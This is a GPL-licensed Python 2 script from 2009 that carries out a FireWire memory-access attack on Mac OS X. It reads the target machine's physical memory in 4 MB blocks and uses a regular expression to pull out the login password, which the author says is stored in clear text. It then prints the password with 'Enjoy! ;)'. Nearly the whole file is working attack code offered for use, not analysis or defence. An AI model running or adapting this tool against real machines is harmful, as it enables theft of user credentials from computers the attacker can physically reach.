# Mac OS X loginwindow.app password finder through Firewire attack
# Copyright (c) 2009 iZsh - izsh at iphone-dev.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# =============
#  Description
# =============
#
# This script search through the target computer memory space (connected
# through a firewire cable) and try to retrieve Apple loginwindow.app
# password. Yeah... Apple is so amazingly smart they keep it forever in
# memory in clear text.
#
# You need pyfw from http://c0re.23.nu/c0de/pyfw/
#
# =======
#  Usage
# =======
# % python macloginpwdfinder-fw.py
#

import sys, time
import fw
import re

BLOCKSIZE = 1024*1024*4

devices = fw.scanbus()

def format_guid(i):
    return ':'.join(["".join(x) for x in zip(("%016x" % i)[::2], ("%016x" % i)[1::2])])

start = 0x00100000L
end =   0x80000000L

print "Mac OS X loginwindow.app password finder through"
print "a Firewire attack."
print "Copyright (c) 2009 iZsh - izsh at iphone-dev.com"
print "================================================\n"

for device in devices:
  print "Found device %s" % (format_guid(device.guid))
  pos = start
  buffer_last = ""
  while pos < end:
    print "\r-> reading %08x ..." % (pos),
    buffer_cur = device.read(pos, BLOCKSIZE)
    print hex(device.lastResultCode*1L),
    pos += BLOCKSIZE
    sys.stdout.flush()
    # Let's see if we can find the password
    buffer = buffer_last + buffer_cur
    m = re.search('password[\000]+([^\000]+)[\000]+shell', buffer)
    if m:
      print "\nFound Apple loginwindow.app password: " + m.group(1)
      print "Enjoy! ;)"
      break
    buffer_last = buffer_cur